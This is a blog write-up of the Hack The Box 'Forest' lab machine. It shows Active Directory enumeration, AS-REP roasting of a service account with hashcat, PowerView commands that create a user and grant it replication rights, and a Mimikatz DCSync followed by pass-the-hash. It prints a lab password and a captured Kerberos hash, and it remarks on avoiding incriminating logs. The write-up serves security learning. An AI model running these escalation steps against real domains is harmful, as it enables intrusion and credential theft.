---
layout:     post
title2:      HacktheBox Writeup - Forest - padraignix.github.io
title:     Hack the Box - Forest
date:       2020-4-3 12:00:00 -0400
summary:    HTB Forest machine walkthrough. Forest started with Windows enumeration using SMB and LDAP queries that lead to leveraging a lingering service account with PRE_AUTH disabled for user access. Once on the machine, we were able to abuse the existing Active Directory entitlements to create a malicious user entry with the rights to perform a DCSync using Mimikatz to acquire the Administrator's hash, finally using it to execute a pass-the-hash escalation to Administrator.
categories: [hack-the-box]
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,infosec,cybersecurity,forest,active directory,AD,pass-the-hash,pth,mimikatz,bloodhound,dcsync
thumbnail:  https://padraignix.github.io/assets/htb-forest/infocard.PNG
canon:      https://padraignix.github.io/hack-the-box/2020/04/03/htb-machine-forest/
tags:
 - htb 
 - active-directory
 - mimikatz
 - bloodhound
 - dcsync
 - kerberos
---

<h1>Introduction</h1>
<p>
<img width="75%" height="75%" src="{{ '/assets/htb-forest/infocard.PNG' | relative_url }}">
</p>

<p>Forest started with Windows enumeration using SMB and LDAP queries that lead to leveraging a lingering service account with PRE_AUTH disabled for user access. Once on the machine, we were able to abuse the existing Active Directory entitlements to create a malicious user entry with the rights to perform a DCSync using Mimikatz to acquire the Administrator's hash, finally using it to execute a pass-the-hash escalation to Administrator.</p>

<p>Despite the chronological time of this writeup being released, Forest was one of the first HTB machines where I really had a chance to dig into AD/Kerberos from a Windows and offensive tools perspective. There were definitely some roadbumps throughout the process, but looking back on it now that I have completed a few more of these types of machines I realize Forest was indeed a great introduction to the technology stack.</p>

<h1>Initial Recon</h1>

<p>Let us kick this off with an NMAP scan to see what we are working with.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Forest# nmap -sV -sC 10.10.10.161
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 22:29 EDT
Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.91% done; ETC: 22:32 (0:00:12 remaining)
Stats: 0:04:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.93% done; ETC: 22:33 (0:00:00 remaining)
Nmap scan report for 10.10.10.161
Host is up (0.12s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-21 02:37:50Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=10/20%Time=5DAD183B%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m37s, deviation: 4h02m33s, median: 7m34s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-10-20T19:40:11-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-10-20 22:40:06
|_  start_date: 2019-10-20 22:26:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.17 seconds
{% endhighlight %}

<p>Side comment: Going back through my notes makes me realize how much I've learned from a process standpoint. Today, if I would have seen the above and immediately would have gone for an LDAP root-dse query followed up by enumerating users from that angle. I will leave the details of how that can be done out for now as I will address it in coming writeups.</p>

<p>We needed to continue our enumeration. I tried a few different things like SMB enumeration, NMAP scripts, and enum4linux. They all "worked" but I feel in this particular case enum4linux provided the most relevant data.</p>

{% highlight shell %}
 ============================= 
|    Users on 10.10.10.161    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)
index: 0x2372 RID: 0x1db1 acb: 0x00000010 Account: backdoor	Name: (null)	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[backdoor] rid:[0x1db1]
{% endhighlight %}

<p>With this we have a few user accounts to play with. Let us see what we can do with them.</p>

<h1>User exploitation</h1>

<p>Time to go a bit into Kerberos theory. If we follow the diagram I whipped up below we can follow the three steps of accessing a Kerberized service: AS -> TGT -> TGS.</p>

<p>
<img src="{{ '/assets/htb-forest/kerberos-authflow.PNG' | relative_url }}">
</p>

<p>To understand the next step and why we chose a certain script within impacket, let us add one extra detail to this background authentication flow - kerberos pre-authentication. <a href="https://ldapwiki.com/wiki/Kerberos%20Pre-Authentication">LDAPwiki</a> does a great job of explaining firstly what it is and then what can happen when it is not set.</p>

<blockquote>
Kerberos Pre-Authentication is a security feature which offers protection against password-guessing attacks. The AS request identifies the client to the KDC in Plaintext. If Kerberos Pre-Authentication is enabled, a Timestamp will be encrypted using the user's password hash as an encryption key. If the KDC reads a valid time when using the user's password hash, which is available in the Microsoft Active Directory, to decrypt the Timestamp, the KDC knows that request isn't a replay of a previous request.
<br><br>
Without Kerberos Pre-Authentication a malicious attacker can directly send a dummy request for authentication. The KDC will return an encrypted TGT and the attacker can brute force it offline.
</blockquote>

<p>That last part is exactly what we are interested in. If there are accounts that have <code>pre_auth</code> explicitly disabled we would be able to request a TGT as that user and then pass the encrypted data to our favorite JTR/Hashcat. Impacket has a very useful script for exactly this - GetNPUsers.py.</p>

<p>
<img src="{{ '/assets/htb-forest/recon-npusers.PNG' | relative_url }}">
</p>

<p>Excellent! Looks like we were able to capture a request for the account svc_alfresco. If we take a quick peek at the captured hash...</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Forest# cat npusers.hash 
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ab01345dba7d10f018f58623f1725fd8$3d748c20fdd6239e33e8633ef8791d87ceb0f509bd1c1c32d39e61e0db0bc6eef88f493a81f94746236954408fd5761451b52c3dfa7000772edc2879b22bdb86eb782c778a0ea2049e67bef67744a0de7cdaed5e0b0117b709d5a43714d599a901970e89d416ea18658afac91d1ce69302c9ed196ed304420a325d23f6f367a690e96b7fa448b114fa36b65ab2d3e9c95c96ddea5965cc5655b5c3b200385ce7bf255f4efef28cbe3d87c722729e4fb5c11f2e912a63c960960a6c725c941efed3f87eab257c9cc20b9ebd8f7cdb308495c7c849540c8179c8fe4c20723219cecf7173017914
{% endhighlight %}

<p>For no other reason than "because" I felt like using Hashcat at this particular point. If we run this hash through hashcat with the trusty rockyou.txt wordlist.</p>

<p>
<img src="{{ '/assets/htb-forest/recon-hashcat.PNG' | relative_url }}">
</p>

<p>We now have a user and password credential set! Perfect! Let us log in and see if we can get to our first flag.</p>

<p>
<img src="{{ '/assets/htb-forest/user-pwned.PNG' | relative_url }}">
</p>
<p>
<img src="{{ '/assets/htb-forest/user-pwned2.PNG' | relative_url }}">
</p>

<p>User down, time to move on to Administrator.</p>

<h1>Root exploitation</h1>

<p>Now that we have user access, let's see how we can escalate our entitlements. Since this is a Windows/Active Directory based machine we can use tooling like Bloodhound to check on combined entitlements that can be used to help our efforts out. I focused on using the python version as I found it easier and more stable to work with rather than running on the host locally and passing the result files back over to our own machine.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/impacket/BloodHound.py# python3 bloodhound.py -d htb.local -u svc-alfresco -p s3rvice -gc htb.local -ns 10.10.10.161 -dc htb.local -c all
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 35 users
INFO: Found 72 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 24S
{% endhighlight %}

<p>Starting our ne04j and bloodhound instances locally we can then import these result files. First we trace down what entitlements our svc-alfresco service account has, then secondly show the relationships our end-goal Administrator has.</p>

<p>
<img src="{{ '/assets/htb-forest/root-bloodhound.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-forest/root-bloodhound2.PNG' | relative_url }}">
</p>


<p>So what does this mean? Took me awhile to understand what angle we wanted to achieve here. It essentially boils down to we have the ability, to give ourselves the ability, to trigger a DCSync between the EXCH01.htb.local and FOREST.htb.local, which should provide us the Administrator (or any account for that matter) password hash.</p>

<p>The theory behind the approach can be seen <a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md">this github repo</a> and has a few other related escalation approaches worth reading up on. First up, we need to ensure we are added to the <i>Exchange Windows Permissions</i> Group which grants up writeDACL on the domain object itself. Again here, knowing what I know now I would have just leveraged svc-alfresco and added that account the group, but for my lack of understanding I first created a new user, TEST3, to which I then added to the proper groups.</p>

{% highlight shell %}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-NetUser -UserName TEST3 -Password Password123 -GroupName "Domain Users" -Domain 'htb.local'
[*] User TEST3 successfully created in domain htb.local
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-NetGroupUser -UserName TEST3 -GroupName "Service Accounts" -Domain forest.htb.local
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-NetGroupUser -UserName TEST3 -GroupName "EXCHANGE WINDOWS PERMISSIONS" -Domain htb.local
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-NetGroupUser -UserName TEST3 -GroupName "GROUP POLICY CREATOR OWNERS" -Domain htb.local
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-NetGroupUser -UserName TEST3 -GroupName "ORGANIZATION MANAGEMENT" -Domain htb.local
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-NetGroupUser -UserName TEST3 -GroupName "EXCHANGE TRUSTED SUBSYSTEM" -Domain htb.local
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user TEST3 /domain
User name                    TEST3
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/22/2019 8:51:39 PM
Password expires             12/3/2019 8:51:39 PM
Password changeable          10/23/2019 8:51:39 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Exchange Windows Perm*Organization Manageme
                             *Domain Users         *Group Policy Creator 
                             *Exchange Trusted Subs
{% endhighlight %}

<p>With our user created and in the right group, we still had one last step to prepare before we could execute the dcsync exploit. The theory behind the approach can be seen <a href="https://adsecurity.org/?p=1729">this article</a> and elaborates that we should need <i>DS-Replication-Get-Changes-All</i>. Let's add that to our new TEST3 user.</p>

{% highlight shell %}
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
Add-ADPermission "DC=htb,DC=local" -User $id.Name -ExtendedRights Ds-Replication-Get-Changes-All
{% endhighlight %}

<p>A quick relog to apply the changes and now we should be ready to kick off the dcsync. Despite many options available I ended up loading mimikatz to the host to run the attack locally.</p>

<p>
<img src="{{ '/assets/htb-forest/root-mimikatz-nltm.PNG' | relative_url }}">
</p>

<p>Beautiful, we have our Administrator hash. All that is left is to kick off a pass-the-hash to start a session as Administrator.</p>

<p>
<img src="{{ '/assets/htb-forest/root-owned1.PNG' | relative_url }}">
</p>

<p>Last step, let's get root.txt.</p>

<p>
<img src="{{ '/assets/htb-forest/root-owned2.PNG' | relative_url }}">
</p>

<p>And just like that Forest is complete. Thanks folks until next time.</p>

<h1>Extra fun</h1>

<p>Looking back on my notes and approach here I definitely see how while this machine was overall simplistic, it highlighted my lack of knowledge on these topics. In future machines of this nature I would generally try and focus on a few different things.</p>

*  Keep things simple and use what is present - Instead of creating a new account which can leave incriminating logs and evidence, I should have leverage the svc-alfresco account more.
*  Avoid uploading files - Similarly instead of sending executables and result files back and forth between hosts I could have tried focusing on remote possibilities.

<p>Overall, it got me to the same conclusion, but the point of going through these exercises is to improve our overall knowledge and thinking processes. This machine definitely achieved that goal.</p>

